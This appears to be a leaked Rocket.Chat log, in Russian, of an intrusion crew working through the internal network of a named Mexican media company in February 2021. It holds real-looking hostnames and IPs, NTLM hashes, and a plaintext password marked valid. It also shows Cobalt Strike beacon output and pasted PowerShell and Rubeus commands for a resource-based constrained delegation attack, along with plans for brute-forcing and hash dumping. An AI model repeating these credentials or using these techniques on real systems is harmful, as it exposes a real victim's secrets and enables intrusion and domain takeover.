@@ -1,0 +1,628 @@
+{
+  "messages": [
+    {
+      "_id": "6raspveXAWcSwGysP",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "два скуля(по ад) из списка имеют этот порт",
+      "ts": "2021-02-11T22:11:54.441Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T22:11:54.484Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zDhPX2kW9mqe4YxtG",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "```\nCORPKIOINTSQLP.CORP.TELEVISA.COM.MX\n10.7.6.186:2717\n```",
+      "ts": "2021-02-11T22:10:04.415Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2021-02-11T22:10:04.492Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "988A57LPC87wtZZJq",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "с точки скана может быть закрыт",
+      "ts": "2021-02-11T21:59:00.329Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T21:59:00.365Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tczWr8Fdsf8p8rDus",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "ну, в одном MSSQLSvc/CORPKIOBDD101.corp.televisa.com.mx:2717\nв остальных нет + этот порт закрыт",
+      "ts": "2021-02-11T21:58:07.944Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T21:58:07.993Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sdEjFhRWCfp49NaeY",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "там пишут порт",
+      "ts": "2021-02-11T21:51:17.827Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T21:51:17.866Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "svwG3PH2Sj6MYWREr",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "а в спн?",
+      "ts": "2021-02-11T21:51:08.626Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T21:51:08.678Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "To2RpenBLAZNFSMd9",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "из ад\n```\nCORPKIOSQLVS02.CORP.TELEVISA.COM.MX\nCORPKIOINTSQLP.CORP.TELEVISA.COM.MX\nCORPKIOCRMSQLD.CORP.TELEVISA.COM.MX\nCORPSFEDSQLD.CORP.TELEVISA.COM.MX\nCORPSFEDSQLP.CORP.TELEVISA.COM.MX\nADMIN_SQL@FILIAL.TELEVISA.COM.MX\nCORPKIOSHPSQLP.CORP.TELEVISA.COM.MX\nCORPKIONCSQL02.CORP.TELEVISA.COM.MX\nCORPKIONCSQL01.CORP.TELEVISA.COM.MX\nCORPKIONCSQL03.CORP.TELEVISA.COM.MX\n```",
+      "ts": "2021-02-11T20:57:20.775Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T20:57:20.913Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "67n5f6f9Y3wKhohzT",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "мы можем как-то еще узнать на каком порту скуль крутится, если ладон и мсф ничего не выдают по скулям?\nу них кастомные порты на скуль\nна одном сервере он крутится на 50101 порту, а на других этот порт закрыт",
+      "ts": "2021-02-11T20:56:45.328Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T20:56:45.373Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8NiCxjYQim8bjcfBR",
+      "rid": "48Aw6FwTqss9QRLft",
+      "ts": "2021-02-11T20:37:08.176Z",
+      "msg": "",
+      "file": {
+        "_id": "iqM5QrkmW9mAnMhkQ",
+        "name": "dll_stub.dll",
+        "type": "application/x-msdownload"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "dll_stub.dll",
+          "title_link": "/file-upload/iqM5QrkmW9mAnMhkQ/dll_stub.dll",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2021-02-11T20:37:08.224Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Xdjuuwk8bbFg47erY",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "`CORP\\ctxdbadmin 7106c947d3a8abbea16cb5448f4ac00a`",
+      "ts": "2021-02-11T20:32:13.852Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-02-11T20:32:13.890Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oeYz9Xo8XeTCQa8FZ",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "у них на одних тачках `Administrator` а на других `Administrador`",
+      "ts": "2021-02-11T18:16:57.715Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-02-11T18:16:57.762Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pTHMpmtanXdSjBC2p",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "ну скорее всего да\nв головном домене почти все на англ)",
+      "ts": "2021-02-11T18:16:04.611Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:16:04.656Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tihsBt94z4w75p9Gm",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "мб у них есть интернешнл диалект",
+      "ts": "2021-02-11T18:15:27.183Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:15:27.238Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ScszawLhtAeQxWDMr",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "испанский только выучить осталось)",
+      "ts": "2021-02-11T18:15:15.299Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:15:15.342Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Y7LNRAJ24HtP76nhM",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "кек",
+      "ts": "2021-02-11T18:14:58.563Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:14:58.606Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TfxYsZfdWKSMEedNx",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "100% ДА это пойти работать в эту компанию админом))",
+      "ts": "2021-02-11T18:14:52.275Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:14:52.334Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8wfK88xmCjfJ8Zmgo",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "это все дает шанс",
+      "ts": "2021-02-11T18:14:35.658Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:14:35.696Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Axvu7jngWtozuHZKm",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "да",
+      "ts": "2021-02-11T18:14:32.218Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:14:32.258Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2NfQ9LqsrKuSnRWoE",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "но проверим скули",
+      "ts": "2021-02-11T18:14:10.720Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:14:10.766Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kFJkTnKyLxt7TYyGk",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "и то даже в  одной половине могут быть одни ЛА, во второй другие ЛА",
+      "ts": "2021-02-11T18:14:01.835Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:14:01.891Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "uRi9HByeM8MCkDper",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "ну да, стоит попробовать\nно шансы, конечно, 50\\50 т.к. мало где пересекаются ЛА, условно в одной группе серверов одни ЛА",
+      "ts": "2021-02-11T18:12:34.592Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:12:34.633Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6ibSRsdG89dWxGGH8",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "и в конечном итоге расширя захват сети найдем ДА",
+      "ts": "2021-02-11T18:10:36.817Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:10:36.864Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4yqPhXZhgf4EK558F",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "мы можем проверить остальной пул серверов с этой группой ЛА",
+      "ts": "2021-02-11T18:10:28.093Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:10:28.145Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ARPQPMbnXdFbdGXTn",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "может быть хешдамп пользака из этой группы",
+      "ts": "2021-02-11T18:10:17.918Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:10:17.957Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hivArbukz2tYMuAWx",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "скуль может иметь локальных админов из группы которую вы раньше не видели",
+      "ts": "2021-02-11T18:10:10.619Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:10:10.661Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qzZcebtT3rbrwbpdB",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "условно",
+      "ts": "2021-02-11T18:09:58.085Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:09:58.132Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HHBwCFPbcF2siSnkz",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "странный вопрос)",
+      "ts": "2021-02-11T18:09:50.065Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:09:50.108Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Wb7mzhKqTc7R7kiHQ",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "```\nCORPKIOBDD101\\sqladmin:::2d593a1a330c2649716df558a5912ceb:::\n```",
+      "ts": "2021-02-11T18:09:40.360Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:09:40.423Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FWF63Z7MAt9giny8Q",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "нет, но разве это нам что то даст? \nесть пару скулей куда есть доступ, но админы сидят прям на ограниченном кол-ве тачек, включая дк и скулей среди них нет",
+      "ts": "2021-02-11T18:09:13.383Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:09:13.414Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "n4J2TMoTXhJPQRAXH",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "вы скуль серваки брутили? или чекали анонимный вход?",
+      "ts": "2021-02-11T18:07:36.547Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:07:36.596Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AyQqgcmDGpzAcAodW",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "но из классики",
+      "ts": "2021-02-11T18:07:27.037Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:07:27.068Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mFHcAAk7dQovY87F2",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "` ты абузил genericall права?`\nнеа",
+      "ts": "2021-02-11T18:07:25.065Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T18:07:25.112Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PNcLRgeQp7PGJbfBy",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "@tl1 ты абузил genericall права?\n```\nFull control of a computer object can be used to perform a resource based constrained delegation attack.\n\nAbusing this primitive is currently only possible through the Rubeus project.\n\nFirst, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:\n\nNew-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)\n\nPowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:\n\n$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid\n\nWe now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:\n\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\n\nNext, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:\n\nGet-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n\nWe can then use Rubeus to hash the plaintext password into its RC4_HMAC form:\n\nRubeus.exe hash /password:Summer2018!\n\nAnd finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:\n\nRubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt\n``` \nесть пользак у которого эти права на дк, точнее даже целая группа, только я не очень понимаю как это работает.\nМы добавляем машинную учетку, типо заменяем оригинальную? То есть мы сбросим пароль от машинной учетки, а т.к. это ДК, то и сеть упадет.",
+      "ts": "2021-02-11T18:06:05.728Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T18:06:05.938Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "Q4ERpGpxBdjKm6wN7",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "-",
+      "ts": "2021-02-11T16:54:16.520Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2021-02-11T16:54:16.567Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fAuB9jGrwnYBHwnpN",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "?",
+      "ts": "2021-02-11T16:49:57.807Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T16:49:57.848Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "a4Kg8jibTh4Dz47Df",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "уязвима:",
+      "ts": "2021-02-11T16:49:56.826Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T16:49:56.873Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9EorGknMX6EaxTMNy",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "2003",
+      "ts": "2021-02-11T16:32:48.158Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T16:32:48.213Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "B3jggDfJNzgByELRJ",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "```\n\nPinging filialeadc01.filial.televisa.com.mx [10.30.17.24] with 32 bytes of data:\nReply from 10.30.17.24: bytes=32 time=67ms TTL=122\n\nPing statistics for 10.30.17.24:\n    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 67ms, Maximum = 67ms, Average = 67ms\n\nbeacon> portscan 10.30.17.24 445 none\n[*] Tasked beacon to scan ports 445 on 10.30.17.24\n[+] host called home, sent: 93285 bytes\n[+] received output:\n10.30.17.24:445\n```",
+      "ts": "2021-02-11T16:32:46.263Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T16:32:46.454Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2SERnXvmzxCuXs9T8",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "+",
+      "ts": "2021-02-11T16:05:15.867Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T16:05:15.927Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "new9AnsfHNSqwzJiS",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "CORPKLHLQRD01 - пасснул",
+      "ts": "2021-02-11T16:04:59.869Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2021-02-11T16:04:59.926Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kQbCkwigzGEftaoE8",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "`demosave.com`",
+      "ts": "2021-02-11T16:03:49.221Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-11T16:03:49.272Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AaQ5PHeHjvMmjTiMC",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "`FILIAL\\Ivargasv 2d0a7cb1ea602f59dc9c7ee5bd11597b` валидные",
+      "ts": "2021-02-11T01:59:50.896Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-02-11T01:59:50.939Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RkbecrPwgjBLDkFP2",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "`FILIAL\\jcgarciae TVSAcrm8888!` валидные",
+      "ts": "2021-02-11T01:38:33.915Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-02-11T01:38:33.966Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
